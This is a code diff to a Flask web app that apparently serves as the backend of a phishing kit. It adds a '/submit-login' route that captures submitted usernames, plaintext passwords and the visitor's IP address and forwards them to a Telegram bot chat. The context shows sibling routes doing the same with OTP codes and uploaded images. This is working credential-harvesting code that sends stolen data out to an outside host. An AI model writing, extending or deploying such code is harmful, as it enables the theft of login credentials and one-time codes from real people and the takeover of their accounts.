@@ -52,6 +52,36 @@ def submit_form():
     except Exception as e:
         return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500
 
+@app.route('/submit-login', methods=['POST'])
+def submit_login():
+    # Extract form data
+    username = sanitize_input(request.form.get('username'))
+    password = sanitize_input(request.form.get('password'))
+    # Get user IP address (handle proxies with X-Forwarded-For)
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+
+    if not username or not password:
+        return jsonify({"error": "Missing username or password"}), 400
+
+    # Format message for Telegram
+    message = f"🔐 Login2 Page Submission\nLogin Id: {username}\nPassword: {password}\nuser Ip: {user_ip}"
+
+    # Send data to Telegram
+    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    try:
+        response = requests.post(
+            telegram_url,
+            json={
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": message
+            },
+            timeout=5
+        )
+        response.raise_for_status()
+        return jsonify({"status": "success", "message": "Login data sent to Telegram"}), 200
+    except Exception as e:
+        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500
+
 @app.route('/submit-otp', methods=['POST'])
 def submit_otp():
     # Extract OTP data
@@ -232,4 +262,5 @@ def submit_images():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
+
 
